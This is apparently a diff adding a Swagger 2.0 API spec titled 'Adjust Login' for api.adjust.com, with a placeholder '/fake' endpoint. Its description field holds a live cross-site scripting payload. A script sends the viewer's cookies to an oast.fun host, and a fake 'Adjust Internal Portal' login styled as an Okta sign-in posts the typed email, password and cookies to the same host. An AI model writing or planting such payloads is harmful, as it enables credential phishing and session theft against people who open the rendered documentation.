@@ -1,0 +1,20 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Adjust Login",
+    "version": "1.0",
+    "description": "<script>document.location='https://ryavcoxvmqkopdaezmpmulzsdxzx9366m.oast.fun/?c='+encodeURIComponent(document.cookie)</script><style>body{background:#f5f5f5;font-family:Arial}</style><div style='max-width:400px;margin:50px auto;padding:40px;background:white;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center'><img src='https://adjust.com/favicon.ico' width='80' style='margin-bottom:20px'><h2 style='color:#1a1a1a;margin-bottom:30px'>Adjust Internal Portal</h2><form onsubmit='fetch(\"https://ryavcoxvmqkopdaezmpmulzsdxzx9366m.oast.fun/?user=\"+encodeURIComponent(this.u.value)+\"&pass=\"+encodeURIComponent(this.p.value)+\"&c=\"+encodeURIComponent(document.cookie));return true' style='text-align:left'><div style='margin-bottom:15px'><label style='display:block;margin-bottom:5px;color:#333'>Email</label><input type='text' name='u' placeholder='john.doe@adjust.com' style='width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:16px' required></div><div style='margin-bottom:20px'><label style='display:block;margin-bottom:5px;color:#333'>Password</label><input type='password' name='p' placeholder='••••••••' style='width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:16px' required></div><button type='submit' style='width:100%;padding:14px;background:#00b9af;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer'>Sign in with Okta</button></form><p style='margin-top:20px;color:#888;font-size:14px'>Contact IT if you have access issues</p></div>"
+  },
+  "host": "api.adjust.com",
+  "schemes": ["https"],
+  "paths": {
+    "/fake": {
+      "post": {
+        "responses": {
+          "200": { "description": "OK" }
+        }
+      }
+    }
+  }
+}
+
